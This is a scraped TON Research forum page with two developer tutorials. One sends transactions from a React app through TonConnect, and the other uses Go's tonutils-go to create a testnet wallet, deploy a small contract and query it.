[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)  February 21, 2024, 2:32pm  1

In the previous part, we made a simple site with authorization through TonConnect, let’s add the functionality of sending a transaction.

## [](#lets-get-started-1)Let’s get started

To send a transaction through tonConnectUI, you need to use the sendTransaction method, and it seems that the tutorial could end there:

```
const transaction = {
	validUntil: Date.now() + 1000000,
	messages: [
		{
			address: "0:412410771DA82CBA306A55FA9E0D43C9D245E38133CB58F1457DFB8D5CD8892F",
			amount: "20000000",
			stateInit: "base64bocblahblahblah==" // just for instance. Replace with your transaction initState or remove
		},
		{
			address: "0:E69F10CC84877ABF539F83F879291E5CA169451BA7BCE91A37A5CED3AB8080D3",
			amount: "60000000",
			payload: "base64bocblahblahblah==" // just for instance. Replace with your transaction payload or remove
		}
	]
}

try {
	const result = await tonConnectUI.sendTransaction(transaction);

	// you can use signed boc to find the transaction 
	const someTxData = await myAppExplorerService.getTransaction(result.boc);
	alert('Transaction was sent successfully', someTxData);
} catch (e) {
	console.error(e);
}
```

But in practice, the task of sending a transaction is wider:

*   the transaction must be sent to the contract, data about it
*   there are a lot of transactions, some convenient abstraction is needed for sending
*   with the transaction, you need to send a payload, which needs to be determined in a convenient way

For the example in this tutorial, we will use the contract from the previous tutorial.

## [](#use-the-wrapper-2)Use the wrapper

Create a contract folder in `src` and copy the `ContractWrapper.ts` file into it from the previous lesson.

```
import { Address,beginCell,Cell,Contract, contractAddress, ContractProvider, Sender, SendMode } from "ton-core";

export class MainContract implements Contract {
	constructor(
		readonly address: Address,
		readonly init?: { code: Cell, data: Cell }
	){}

	static createFromConfig(config: any, code: Cell, workchain = 0){
		const data = beginCell().endCell();
		const init = { code,data };
		const address = contractAddress(workchain, init);

		return new MainContract(address,init);
	}

	async sendInternalMessage(
		provider: ContractProvider,
		sender: Sender,
		value: bigint,
	){
		await provider.internal(sender,{
			value,
			sendMode: SendMode.PAY_GAS_SEPARATELY,
			body: beginCell().endCell(),
		});
	}

	async getData(provider: ContractProvider) {
		const { stack } = await provider.get("get_sender", []);
		return {
			recent_sender: stack.readAddress(),
			number: stack.readNumber(),
		};
	}

}
```

Let’s create a folder for custom hooks `hooks` and create the first custom hook `useInit` in it in the file `useInit.ts`:

```
import {useEffect, useState} from 'react';

export function useInit<T>(

){

}
```

Let’s add the top-level logic for processing the contract initialization state to it:

```
import {useEffect, useState} from 'react';

export function useInit<T>(
  func: () => Promise<T>,
  deps: any[] = []
){
  const [state, setState] = useState<T | undefined>();
  useEffect(()=>{
	(async () => {
		setState(await func());
	})();
  },deps);


  return state;
}
```

To receive data from the blockchain, you need a connection point, for simplicity we will use api toncenter in this case, we will do this in a separate hook `useTonClient.ts`

```
import { TonClient } from "ton";
import { useInit } from "./useInit";

export function useTonClient() {
	return useInit(
		async () =>
			new TonClient({
				endpoint: "https://testnet.toncenter.com/api/v2/jsonRPC",
			})
	);
}
```

Finally, we move on to the hook that will interact with our contract, create `useContractWrapper.ts` and immediately import the hooks we created and some additional functions from the libraries we have already installed there.

```
import {useEffect, useState} from 'react';
import { Address, OpenedContract} from 'ton-core';
import { useInit } from './useInit';
import { MainContract } from '../contracts/ContractWrapper';
import { useTonClient } from './useTonClient';

export function useContractWrapper() {

}
```

To work with the contract, you need a connection, let’s create it using the `useTonClient()` hook and also describe the contract data:

```
import {useEffect, useState} from 'react';
import { Address, OpenedContract} from 'ton-core';
import { useInit } from './useInit';
import { MainContract } from '../contracts/ContractWrapper';
import { useTonClient } from './useTonClient';

export function useContractWrapper() {
	const client = useTonClient();

	const [contractData, setContractData] = useState<null | {
		recent_sender: Address;
		number: number;
	}>();

}
```

We open the contract and get the data using the Get method

```
import {useEffect, useState} from 'react';
import { Address, OpenedContract} from 'ton-core';
import { useInit } from './useInit';
import { MainContract } from '../contracts/ContractWrapper';
import { useTonClient } from './useTonClient';

export function useContractWrapper() {
	const client = useTonClient();

	const [contractData, setContractData] = useState<null | {
		recent_sender: Address;
		number: number;
	}>();

	const mainContract = useInit( async () => {
		if (!client) return;
		const contract = new MainContract(
			Address.parse("kQACwi82x8jaITAtniyEzho5_H1gamQ1xQ20As_1fboIfJ4h")
		);
		return client.open(contract) as OpenedContract<MainContract>;
	},[client]);

	useEffect( () => {
		async function getValue() {
			if(!mainContract) return;
			setContractData(null);
			const instack = await mainContract.getData();
			setContractData({
				recent_sender: instack.recent_sender,
				number: instack.number,
			});
		}
		getValue();
	}, [mainContract]);

}
```

It remains only to return the contract data and its address:

```
import {useEffect, useState} from 'react';
import { Address, OpenedContract} from 'ton-core';
import { useInit } from './useInit';
import { MainContract } from '../contracts/ContractWrapper';
import { useTonClient } from './useTonClient';

export function useContractWrapper() {
	const client = useTonClient();

	const [contractData, setContractData] = useState<null | {
		recent_sender: Address;
		number: number;
	}>();

	const mainContract = useInit( async () => {
		if (!client) return;
		const contract = new MainContract(
			Address.parse("kQACwi82x8jaITAtniyEzho5_H1gamQ1xQ20As_1fboIfJ4h")
		);
		return client.open(contract) as OpenedContract<MainContract>;
	},[client]);

	useEffect( () => {
		async function getValue() {
			if(!mainContract) return;
			setContractData(null);
			const instack = await mainContract.getData();
			setContractData({
				recent_sender: instack.recent_sender,
				number: instack.number,
			});
		}
		getValue();
	}, [mainContract]);

	return {
		contract_address: mainContract?.address.toString(),
		...contractData,
	};
}
```

Now go to the `App.ts` file and import the `useContractWrapper` hook

```
import './App.css'
import { TonConnectButton } from '@tonconnect/ui-react'
import { useContractWrapper } from './hooks/useContractWrapper'

function App() {
  return (
	<>
	  <TonConnectButton/>
	</>

  )
}

export default App;
```

Let’s call the hook and display the information, remembering to cast the sender’s address to the string.

```
import './App.css'
import { TonConnectButton } from '@tonconnect/ui-react'
import { useContractWrapper } from './hooks/useContractWrapper'

function App() {
  const {
	recent_sender,
	number,
	contract_address,
  } = useContractWrapper();

  return (
	<>
	  <TonConnectButton/>
	  <div>
	  <b>Contract Address:</b>
	  <div>{contract_address}</div>
	  <b>Last Sender Address</b>
	  <div>{recent_sender?.toString()}</div>
	  <b>Check num</b>
	  <div>{number}</div>
	  </div>
	</>

  )
}

export default App;
```

Run the application with the `yarn dev` command. Make sure you can see the smart contract data.

## [](#sending-a-transaction-3)Sending a transaction

Suppose you are making an application with a large number of transactions in different contracts, in this case it would be convenient to make one hook for sending transactions, into which the parameters would simply be thrown. Despite the fact that our example is simple, we will do just that, we create a `useConnection.ts` hook:

```
import { useTonConnectUI } from "@tonconnect/ui-react";
import { Sender, SenderArguments} from "ton-core";

export function useConnection(): {} {
	const [useTonConnectUI] = useTonConnectUI();

}
```

It will assume a call with arguments for a transaction and return a sender object (sending a transaction) and connected (whether the user’s wallet is connected -  
then for the convenience of forming the logic ui).

```
import { useTonConnectUI } from "@tonconnect/ui-react";
import { Sender, SenderArguments} from "ton-core";

export function useConnection(): { sender: Sender; connected: boolean} {
	const [TonConnectUI] = useTonConnectUI();

	return {
		sender: {
		  send: async (args: SenderArguments) => {
			TonConnectUI.sendTransaction({
			  messages: [
				{
				  address: args.to.toString(),
				  amount: args.value.toString(),
				  payload: args.body?.toBoc().toString("base64"),
				},
			  ],
			  validUntil: Date.now() + 6 * 60 * 1000, 
			});
		  },
		},
		connected: TonConnectUI.connected,
	  };

}
```

The validUntil field is required for security, so that when a connection is intercepted, someone cannot resend it.

Now we need to modify the `useContractWrapper.ts` hook to send a transaction, as well as update information every 5 seconds (the time of updating the TON blockchain).

Import useConnection.ts and use it:

```
import {useEffect, useState} from 'react';
import { Address, OpenedContract} from 'ton-core';
import { useInit } from './useInit';
import { MainContract } from '../contracts/ContractWrapper';
import { useTonClient } from './useTonClient';
import { useConnection } from './useConnection';

export function useContractWrapper() {
	const client = useTonClient();
	const connection = useConnection();

	const [contractData, setContractData] = useState<null | {
		recent_sender: Address;
		number: number;
	}>();

	const mainContract = useInit( async () => {
		if (!client) return;
		const contract = new MainContract(
			Address.parse("kQACwi82x8jaITAtniyEzho5_H1gamQ1xQ20As_1fboIfJ4h")
		);
		return client.open(contract) as OpenedContract<MainContract>;
	},[client]);

	useEffect( () => {
		async function getValue() {
			if(!mainContract) return;
			setContractData(null);
			const instack = await mainContract.getData();
			setContractData({
				recent_sender: instack.recent_sender,
				number: instack.number,
			});
		}
		getValue();
	}, [mainContract]);

	return {
		contract_address: mainContract?.address.toString(),
		...contractData,
	};
}
```

To update every 5 seconds, let’s add the `sleep()` function and add it and getting data from the Get method to the `useEffect` hook:

```
import {useEffect, useState} from 'react';
import { Address, OpenedContract} from 'ton-core';
import { useInit } from './useInit';
import { MainContract } from '../contracts/ContractWrapper';
import { useTonClient } from './useTonClient';
import { useConnection } from './useConnection';

export function useContractWrapper() {
	const client = useTonClient();
	const connection = useConnection();

	const sleep =(time: number) =>
		new Promise((resolve) => setTimeout(resolve, time));


	const [contractData, setContractData] = useState<null | {
		recent_sender: Address;
		number: number;
	}>();

	const mainContract = useInit( async () => {
		if (!client) return;
		const contract = new MainContract(
			Address.parse("kQACwi82x8jaITAtniyEzho5_H1gamQ1xQ20As_1fboIfJ4h")
		);
		return client.open(contract) as OpenedContract<MainContract>;
	},[client]);

	useEffect( () => {
		async function getValue() {
			if(!mainContract) return;
			setContractData(null);
			const instack = await mainContract.getData();
			setContractData({
				recent_sender: instack.recent_sender,
				number: instack.number,
			});
			await sleep(5000);
			getValue();
		}
		getValue();
	}, [mainContract]);

	return {
		contract_address: mainContract?.address.toString(),
		...contractData,
	};
}
```

It remains to add the function of sending an internal message to `return`.

```
import {useEffect, useState} from 'react';
import { Address, OpenedContract, toNano} from 'ton-core';
import { useInit } from './useInit';
import { MainContract } from '../contracts/ContractWrapper';
import { useTonClient } from './useTonClient';
import { useConnection } from './useConnection';

export function useContractWrapper() {
	const client = useTonClient();
	const connection = useConnection();

	const sleep =(time: number) =>
		new Promise((resolve) => setTimeout(resolve, time));


	const [contractData, setContractData] = useState<null | {
		recent_sender: Address;
		number: number;
	}>();

	const mainContract = useInit( async () => {
		if (!client) return;
		const contract = new MainContract(
			Address.parse("kQACwi82x8jaITAtniyEzho5_H1gamQ1xQ20As_1fboIfJ4h")
		);
		return client.open(contract) as OpenedContract<MainContract>;
	},[client]);

	useEffect( () => {
		async function getValue() {
			if(!mainContract) return;
			setContractData(null);
			const instack = await mainContract.getData();
			setContractData({
				recent_sender: instack.recent_sender,
				number: instack.number,
			});
			await sleep(5000);
			getValue();
		}
		getValue();
	}, [mainContract]);

	return {
		contract_address: mainContract?.address.toString(),
		...contractData,
		sendInternalMessage: () => {
			return mainContract?.sendInternalMessage(connection.sender, toNano("0.05"));
		}
	};
}
```

Let’s add sending a transaction to the UI, go to the `App.tsx` file and add a connection:

```
import './App.css'
import { TonConnectButton } from '@tonconnect/ui-react'
import { useContractWrapper } from './hooks/useContractWrapper'
import { useConnection } from './hooks/useConnection';

function App() {
  const {
	recent_sender,
	number,
	contract_address,
  } = useContractWrapper();

  const { connected } = useConnection();


  return (
	<>
	  <TonConnectButton/>
	  <div>
	  <b>Contract Address:</b>
	  <div>{contract_address}</div>
	  <b>Last Sender Address</b>
	  <div>{recent_sender?.toString()}</div>
	  <b>Check num</b>
	  <div>{number}</div>
	  </div>
	</>

  )
}

export default App;
```

The connection will allow displaying a link to send a transaction:

```
import './App.css'
import { TonConnectButton } from '@tonconnect/ui-react'
import { useContractWrapper } from './hooks/useContractWrapper'
import { useConnection } from './hooks/useConnection';

function App() {
  const {
	recent_sender,
	number,
	contract_address,
	sendInternalMessage,
  } = useContractWrapper();

  const { connected } = useConnection();


  return (
	<>
	  <TonConnectButton/>
	  <div>
	  <b>Contract Address:</b>
	  <div>{contract_address}</div>
	  <b>Last Sender Address</b>
	  <div>{recent_sender?.toString()}</div>
	  <b>Check num</b>
	  <div>{number}</div>

	  {connected && (
		<a
		  onClick={()=>{
			sendInternalMessage();
		  }}
		>
		  Send internal Message
		</a>
	  )}


	  </div>
	</>

  )
}

export default App;
```

Check sending transaction - `yarn dev`

## [](#conclusion-4)Conclusion

I write similar tutorials and analyzes on the TON network in my channel - [Telegram: Contact @ton\_learn](https://t.me/ton_learn) . I will be glad to your subscription.

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/tonconnect/sendtx.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/tonconnect/sendtx.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/tonconnect/sendtx.md)

````
# Ton Connect React ui send transaction

In the previous part, we made a simple site with authorization through TonConnect, let's add the functionality of sending a transaction.

## Let's get started

To send a transaction through tonConnectUI, you need to use the sendTransaction method, and it seems that the tutorial could end there:
```ts
const transaction = {
	validUntil: Date.now() + 1000000,
	messages: [
		{
			address: "0:412410771DA82CBA306A55FA9E0D43C9D245E38133CB58F1457DFB8D5CD8892F",
			amount: "20000000",
			stateInit: "base64bocblahblahblah==" // just for instance. Replace with your transaction initState or remove
		},
		{
			address: "0:E69F10CC84877ABF539F83F879291E5CA169451BA7BCE91A37A5CED3AB8080D3",
			amount: "60000000",
			payload: "base64bocblahblahblah==" // just for instance. Replace with your transaction payload or remove
````

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/tonconnect/sendtx.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 448

[TON Research](/)

# [Golang Scripts - convenient scripts for working with TON - Lesson 1 Create a wallet and deploy a smart contract](/t/golang-scripts-convenient-scripts-for-working-with-ton-lesson-1-create-a-wallet-and-deploy-a-smart-contract/448)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)   February 21, 2024, 2:41pm  1

# [](#create-wallet-and-deploy-contract-with-go-1)Create wallet and deploy contract with GO

## [](#introduction-2)Introduction

In the tondev chat, questions often arise about interacting with TON using popular programming languages, especially questions about interacting with NFT collections and contracts in general. Therefore, for [ton\_learn](https://t.me/ton_learn) I decided to make 2 lessons where we interact with the TON blockchain using some scripts, so that the reader can easily work with smart contracts in TON.

The tasks are:

*   in this lesson we will make a blank with a wallet, which we will use later, and also figure out how to deploy and interact with the contract from the first lesson
*   in the next lesson we will deploy the NFT collection, and also call the Get-methods

To work with TON with scripts, we will use the GO library [tonutils-go](https://github.com/xssnick/tonutils-go). This library has an excellent balance between high-level and low-level, so it allows you to write simple scripts, but at the same time does not deprive us of various possibilities for working with the TON blockchain.

Even if you are not familiar with GO, I am sure that this lesson and scripts will be clear to you, but just in case, at the very end of the lesson there are links to materials that will allow you to quickly get used to GO.

> I would also like to note that this library has good documentation with examples.

## [](#create-wallet-3)Create wallet

We need a wallet to send messages inside TON (those that come to recv\_internal()). Essentially, a wallet is a smart contract capable of receiving external messages (those recv\_external()) and sending internal ones. Therefore, before moving on to deploying a smart contract, we first create a wallet.

### [](#connecting-to-the-network-4)Connecting to the network

A wallet in the TON network is a smart contract, in order to deploy a smart contract to a test or main network, we need to connect to the network, for this we need its config:

*   [testnet config](https://ton-blockchain.github.io/testnet-global.config.json)
*   [mainnet config](https://ton-blockchain.github.io/global.config.json)(mainnet)

We will interact with the network through light servers.

> Light client (English lite-client) is a software that connects to full nodes to interact with the blockchain. They help users access and interact with the blockchain without the need to synchronize the entire blockchain.

So let’s connect:

```
client := liteclient.NewConnectionPool()

configUrl := "https://ton-blockchain.github.io/testnet-global.config.json"

err := client.AddConnectionsFromConfigUrl(context.Background(), configUrl)
if err != nil {
	panic(err)
}
api := ton.NewAPIClient(client)
```

We get the lightserver api.

> If you look at the configs you can see some lightservers inside, which one does the library choose? - The first with which there will be a successful connection

### [](#seed-phrase-5)Seed phrase

To generate a wallet, we need a public / private key pair (we will receive them using the Seed phrase) and the [InitialAccountWallet](https://github.com/ton-blockchain/ton/blob/master/tl/generate/scheme/tonlib_api.tl#L60) structure corresponding to one of the available wallet versions.

> Seed phrase - a sequence of words used to generate keys.

Let’s generate a seed phrase using `wallet.NewSeed()` and print it so that we can copy and use the wallet in the future.

```
seed := wallet.NewSeed()
fmt.Println("Seed phrase:")
fmt.Println(seed)
```

This phrase can and should be saved in order to use the wallet in the future.

We generate a wallet and display the address.

```
w, err := wallet.FromSeed(api, seed, wallet.V3)
if err != nil {
	log.Fatalln("FromSeed err:", err.Error())
	return
}

fmt.Println(w.Address())
```

You can read more about different wallet versions [here](https://github.com/toncenter/tonweb/blob/master/src/contract/wallet/WalletSources.md).

### [](#activate-wallet-6)“Activate” wallet

According to [documentation](https://ton-blockchain.github.io/docs/#/payment-processing/overview?id=deploying-wallet), Toncoin must be sent to the received address. The testnet has a bot [Telegram: Contact @testgiver\_ton\_bot](https://t.me/testgiver_ton_bot) for this. On the mainnet, I will attach the official [page](https://ton-blockchain.github.io/buy-toncoin).

### [](#get-the-balance-7)Get the balance

Our wallet is ready and in order to get the balance, you need to get the current information about the network (namely the current block).

```
block, err := api.CurrentMasterchainInfo(context.Background())
if err != nil {
	log.Fatalln("CurrentMasterchainInfo err:", err.Error())
	return
}
```

And then get the balance from the block:

```
balance, err := w.GetBalance(context.Background(), block)
if err != nil {
	log.Fatalln("GetBalance err:", err.Error())
	return
}

fmt.Println(balance)
```

Final `createwallet.go` code:

```
package main

import (
	"context"
	"log"
	"fmt"

	"github.com/xssnick/tonutils-go/liteclient"
	"github.com/xssnick/tonutils-go/ton"
	"github.com/xssnick/tonutils-go/ton/wallet"
)

func main() {


	client := liteclient.NewConnectionPool()

	configUrl := "https://ton-blockchain.github.io/testnet-global.config.json"


	err := client.AddConnectionsFromConfigUrl(context.Background(), configUrl)
	if err != nil {
		panic(err)
	}
	api := ton.NewAPIClient(client)

	seed := wallet.NewSeed()
	fmt.Println("Seed phrase:")
	fmt.Println(seed)

	w, err := wallet.FromSeed(api, seed, wallet.V3)
	if err != nil {
		log.Fatalln("FromSeed err:", err.Error())
		return
	}

	fmt.Println(w.Address())

	block, err := api.CurrentMasterchainInfo(context.Background())
	if err != nil {
		log.Fatalln("CurrentMasterchainInfo err:", err.Error())
		return
	}


	balance, err := w.GetBalance(context.Background(), block)
	if err != nil {
		log.Fatalln("GetBalance err:", err.Error())
		return
	}

	fmt.Println(balance)

}
```

Before we move on, we will move the generation of the wallet according to the seed phrase into a separate function.

### [](#wallet-function-8)Wallet function

Since we already have a seed phrase, we do not need to generate it anymore, all that remains is to collect the wallet.

```
func getWallet(api *ton.APIClient) *wallet.Wallet {
	words := strings.Split("write your seed phrase here", " ")
	w, err := wallet.FromSeed(api, words, wallet.V3)
	if err != nil {
		panic(err)
	}
	return w
}
```

An example of generating a wallet with a similar function is in a separate file `walletfunc.go`.

## [](#deploy-smart-contract-9)Deploy smart contract

### [](#hexboc-smart-contract-10)hexBoc smart contract

Now that we have a wallet with a Toncoin balance on it, we can deploy smart contracts. In the `tonutils-go` library, you can deploy a smart contract in the form of hexBoc. Boc is a serialized form of a smart contract (bag-of-cells).

The easiest way to translate a smart contract into a similar form is to use a fift script. Let’s take the fift code from the first smart contract and write a script that will translate it into hexBoc.

```
"Asm.fif" include
// automatically generated from `C:\Users\7272~1\AppData\Local\toncli\toncli\func-libs\stdlib-tests.func` `C:\Users\7272~1\Documents\chain\firsttest\wallet\func\code.func` 
PROGRAM{
  DECLPROC recv_internal
  128253 DECLMETHOD get_total
  recv_internal PROC:<{
	//  in_msg_body
	DUP	//  in_msg_body in_msg_body
	SBITS	//  in_msg_body _2
	32 LESSINT	//  in_msg_body _4
	35 THROWIF
	32 LDU	//  _24 _23
	DROP	//  n
	c4 PUSH	//  n _11
	CTOS	//  n ds
	64 LDU	//  n _26 _25
	DROP	//  n total
	SWAP	//  total n
	ADD	//  total
	NEWC	//  total _18
	64 STU	//  _20
	ENDC	//  _21
	c4 POP
  }>
  get_total PROC:<{
	// 
	c4 PUSH	//  _1
	CTOS	//  ds
	64 LDU	//  _8 _7
	DROP	//  total
  }>
}END>c
```

> If you went through the first lesson, then the Fift contract code is in the fift folder

Now the script that will translate the code into hexBOC format:

```
#!/usr/bin/fift -s
"TonUtil.fif" include
"Asm.fif" include

."first contract:" cr

"first.fif" include
2 boc+>B dup Bx. cr cr
```

I will not dwell on fift in detail, this is beyond the scope of this lesson, I will only note:

*   boc+>B - serializes to boc format
*   cr - displays the value in a string

> You can run the script either using the familiar toncli, namely `toncli fift run` , or as described [here](https://ton-blockchain.github.io/docs/#/compile?id=fift).

An example script is in the `print-hex.fif` file.

As a result, we will get:

B5EE9C72410104010038000114FF00F4A413F4BCF2C80B0102016202030032D020D749C120F263D31F30ED44D0D33F3001A0C8CB3FC9ED540011A1E9FBDA89A1A67E693

### [](#approaching-the-deployment-of-the-contract-11)Approaching the deployment of the contract

We take our blank with the wallet `walletfunc.go` from it we will make a contract deployment script. The first thing we will do is add the `getContractCode()` function, which will convert the hexBOC received earlier into bytes:

```
func getContractCode() *cell.Cell {
	var hexBOC = "B5EE9C72410104010038000114FF00F4A413F4BCF2C80B0102016202030032D020D749C120F263D31F30ED44D0D33F3001A0C8CB3FC9ED540011A1E9FBDA89A1A67E61A6614973"
	codeCellBytes, _ := hex.DecodeString(hexBOC)

	codeCell, err := cell.FromBOC(codeCellBytes)
	if err != nil {
		panic(err)
	}

	return codeCell
}
```

### [](#smart-contract-deployment-process-12)Smart contract deployment process

To deploy a smart contract, we need to form a `StateInit`. `StateInit` is a combination of the smart contract code we already have and the smart contract data. The smart contract data is what we want to put in the `c4` register, often the address of the owner of the smart contract is put there to manage it. You could see examples in lessons 9 and 10, where the owner of the NFT collection or Jetton was stored in `c4`. In our example, we can put 0 or any number there, the main thing is 64 bits, so that it is 64 bits, for the contract logic to work correctly. Let’s make a separate function for the data:

```
func getContractData() *cell.Cell {
	data := cell.BeginCell().MustStoreUInt(2, 64).EndCell()

	return data
}
```

Their StateInit thanks to hashing calculates the address of the smart contract.

It is necessary to send a message to the received address and it is important not to forget about a small amount of TON, since smart contracts must have a positive balance in order to be able to pay for the storage and processing of their data in the blockchain.

You also need to prepare some body for the message, but it can be empty depending on your situation.

In `tonutils-go`, all this logic is inside the `DeployContract` function, calling it in our case will look like this:

```
msgBody := cell.BeginCell().MustStoreUInt(0, 64).EndCell()

fmt.Println("Deploying NFT collection contract to net...")
addr, err := w.DeployContract(context.Background(), tlb.MustFromTON("0.02"),
	msgBody, getContractCode(), getContractData(), true)
if err != nil {
	panic(err)
}

fmt.Println("Deployed contract addr:", addr.String())
```

The `true` parameter specifies whether to “wait” for confirmation that the message has been sent.

> It is important to note that since we get the address hashed, it will not work to deploy the same contract twice with the same data, the message will simply come to an existing contract.

Final `deploycontract.go` code:

```
package main

import (
	"context"
	"log"
	"fmt"
	"encoding/hex"
	"strings"

	"github.com/xssnick/tonutils-go/liteclient"
	"github.com/xssnick/tonutils-go/ton"
	"github.com/xssnick/tonutils-go/ton/wallet"
	"github.com/xssnick/tonutils-go/tlb"
	"github.com/xssnick/tonutils-go/tvm/cell"
)

func main() {


	client := liteclient.NewConnectionPool()

	configUrl := "https://ton-blockchain.github.io/testnet-global.config.json"


	err := client.AddConnectionsFromConfigUrl(context.Background(), configUrl)
	if err != nil {
		panic(err)
	}
	api := ton.NewAPIClient(client)

	w := getWallet(api)

	fmt.Println(w.Address())

	block, err := api.CurrentMasterchainInfo(context.Background())
	if err != nil {
		log.Fatalln("CurrentMasterchainInfo err:", err.Error())
		return
	}


	balance, err := w.GetBalance(context.Background(), block)
	if err != nil {
		log.Fatalln("GetBalance err:", err.Error())
		return
	}

	fmt.Println(balance)



	msgBody := cell.BeginCell().MustStoreUInt(0, 64).EndCell()

	fmt.Println("Deploying NFT collection contract to net...")
	addr, err := w.DeployContract(context.Background(), tlb.MustFromTON("0.02"),
		msgBody, getContractCode(), getContractData(), true)
	if err != nil {
		panic(err)
	}

	fmt.Println("Deployed contract addr:", addr.String())

}


func getWallet(api *ton.APIClient) *wallet.Wallet {
	words := strings.Split("write your seed phrase here", " ")
	w, err := wallet.FromSeed(api, words, wallet.V3)
	if err != nil {
		panic(err)
	}
	return w
}

func getContractCode() *cell.Cell {
	var hexBOC = "B5EE9C72410104010038000114FF00F4A413F4BCF2C80B0102016202030032D020D749C120F263D31F30ED44D0D33F3001A0C8CB3FC9ED540011A1E9FBDA89A1A67E61A6614973"
	codeCellBytes, _ := hex.DecodeString(hexBOC)

	codeCell, err := cell.FromBOC(codeCellBytes)
	if err != nil {
		panic(err)
	}

	return codeCell
}

func getContractData() *cell.Cell {
	data := cell.BeginCell().MustStoreUInt(2, 64).EndCell()

	return data
}
```

## [](#sending-a-message-13)Sending a message

Now let’s test our smart contract, namely, send a message, after which the contract will have to add it to the number in register c4 and save the resulting value. Let’s take our blank with the wallet `walletfunc.go` and add the message sending code to it:

```
fmt.Println("Let's send message")
err = w.Send(context.Background(), &wallet.Message{
 Mode: 3,
 InternalMessage: &tlb.InternalMessage{
  IHRDisabled: true,
  Bounce:      true,
  DstAddr:     address.MustParseAddr("your contract address"),
  Amount:      tlb.MustFromTON("0.05"),
  Body:        cell.BeginCell().MustStoreUInt(11, 32).EndCell(),
 },
}, true)
if err != nil {
 fmt.Println(err)
}
```

The message scheme is still the same as before) It is discussed in more detail in lesson 3. We send a message from our wallet.

## [](#call-the-get-method-14)Call the GET method

Now it remains to check whether the values were summed up in the smart contract. To do this, tonutils-go has RunGetMethod(), in which you need to pass the current block, the address of the smart contract, the method and parameters for the methods.

```
fmt.Println("Get Method")
addr := address.MustParseAddr("your contract address")

// run get method 
res, err := api.RunGetMethod(context.Background(), block, addr, "get_total")
if err != nil {
	// if contract exit code != 0 it will be treated as an error too
	panic(err)
}

fmt.Println(res)
```

It is important to note that if you send a message and call Get contract in a row, the data may not have time to update in the blockchain and you may get the old value. Therefore, we add between sending messages and the Get method, receiving a new block. And [time.Sleep](https://www.geeksforgeeks.org/time-sleep-function-in-golang-with-examples/). Or we comment on the sending of the message and separately call the get method).

> In TON, blocks are updated in 5 seconds.

Sample code is in the `sendandget.go` file

## [](#conclusion-15)Conclusion

In the next tutorial, we will deploy the nft collection. I also wanted to note that tonutil-go has a donation address on their page.

## [](#go-supplement-16)GO Supplement

I have collected a couple of links here that will speed up your understanding of the scripts from this lesson.

### [](#installing-go-17)Installing GO

![](https://tonresear.ch/uploads/default/original/1X/68f11f1b3c0b1083db3cbb7e71ba04a723150d33.png) [go.dev](https://go.dev/)

![](https://tonresear.ch/uploads/default/optimized/1X/51823551a25fe20bbf14ab81cf96d2a06df4bde9_2_690x400.jpeg)

### [The Go Programming Language](https://go.dev/)

Go is an open source programming language that makes it simple to build secure, scalable systems.

### [](#hello-world-on-go-18)Hello world on GO

[https://gobyexample.com/hello-world](https://gobyexample.com/hello-world)

### [](#syntax-in-15-minutes-19)Syntax in 15 minutes

[https://learnxinyminutes.com/docs/go/](https://learnxinyminutes.com/docs/go/)

### [](#error-no-required-module-20)Error No required module

![](https://tonresear.ch/uploads/default/original/1X/d058236bbf509070bd0a551d5d9544ec84cc0988.png) [codesource.io – 2 Jun 22](https://codesource.io/how-to-install-github-packages-in-golang/ "01:52PM - 02 June 2022")

### [How to install GitHub packages in GoLang](https://codesource.io/how-to-install-github-packages-in-golang/)

In this article, you are going to learn how to install GitHub packages in the Go programming language. In the Go programming language

### [](#what-is-context-21)What is context

[https://gobyexample.com/context](https://gobyexample.com/context)

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/golang/14lesson/wallet_eng.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/golang/14lesson/wallet\_eng.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/golang/14lesson/wallet_eng.md)

```
# Create wallet and deploy contract with GO

## Introduction

In the tondev chat, questions often arise about interacting with TON using popular programming languages, especially questions about interacting with NFT collections and contracts in general. Therefore, for [ton_learn](https://t.me/ton_learn) I decided to make 2 lessons where we interact with the TON blockchain using some scripts, so that the reader can easily work with smart contracts in TON.

The tasks are:
- in this lesson we will make a blank with a wallet, which we will use later, and also figure out how to deploy and interact with the contract from the first lesson
- in the next lesson we will deploy the NFT collection, and also call the Get-methods

To work with TON with scripts, we will use the GO library [tonutils-go](https://github.com/xssnick/tonutils-go). This library has an excellent balance between high-level and low-level, so it allows you to write simple scripts, but at the same time does not deprive us of various possibilities for working with the TON blockchain.

Even if you are not familiar with GO, I am sure that this lesson and scripts will be clear to you, but just in case, at the very end of the lesson there are links to materials that will allow you to quickly get used to GO.

> I would also like to note that this library has good documentation with examples.

## Create wallet

We need a wallet to send messages inside TON (those that come to recv_internal()). Essentially, a wallet is a smart contract capable of receiving external messages (those recv_external()) and sending internal ones. Therefore, before moving on to deploying a smart contract, we first create a wallet.

```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/golang/14lesson/wallet_eng.md)

  1 Like

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 45

[TON Research](/)

# [Assessing the Impact of the TON Believers Fund and Locker Smart Contract on TON's Tokenomics and Market Dynamics](/t/assessing-the-impact-of-the-ton-believers-fund-and-locker-smart-contract-on-tons-tokenomics-and-market-dynamics/45)

[TON Blockchain](/c/ton-blockchain/17) 

    

[TFR](https://tonresear.ch/u/TFR)  January 23, 2024, 2:02pm  1

